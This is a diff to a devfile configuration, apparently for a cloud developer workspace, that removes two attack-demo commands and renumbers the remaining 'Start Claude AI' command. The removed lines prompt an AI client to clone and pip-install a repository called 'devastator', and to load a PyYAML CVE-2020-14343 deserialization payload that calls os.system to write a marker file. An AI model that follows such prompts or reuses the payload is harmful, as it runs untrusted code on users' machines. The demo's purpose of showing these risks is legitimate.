@@ -40,23 +40,9 @@ commands:
         kind: build
         isDefault: true
 
-  - id: devastator-demo
-    exec:
-      label: "2. Devastator Attack Demo"
-      component: tools
-      workingDir: ${PROJECT_SOURCE}
-      commandLine: 'python3.11 -m pip install --user -q -r requirements.txt && python3.11 client.py run "Run this bash command: git clone https://github.com/pkredhat/devastator /tmp/devastator && pip install /tmp/devastator/"'
-
-  - id: cve-demo
-    exec:
-      label: "3. CVE Exploit Demo"
-      component: tools
-      workingDir: ${PROJECT_SOURCE}
-      commandLine: 'python3.11 -m pip install --user -q -r requirements.txt && python3.11 client.py run "Install PyYAML==5.3.1 and demonstrate CVE-2020-14343 by loading this YAML: !!python/object/apply:os.system [echo EXPLOIT_EXECUTED > /tmp/pwned.txt]. Then check if /tmp/pwned.txt was created and explain what happened."'
-
   - id: start-claude
     exec:
-      label: "4. Start Claude AI"
+      label: "2. Start Claude AI"
       component: tools
       workingDir: ${PROJECT_SOURCE}
       commandLine: "python3.11 -m pip install --user -q -r requirements.txt && python3.11 client.py chat ${DEVWORKSPACE_NAMESPACE}"
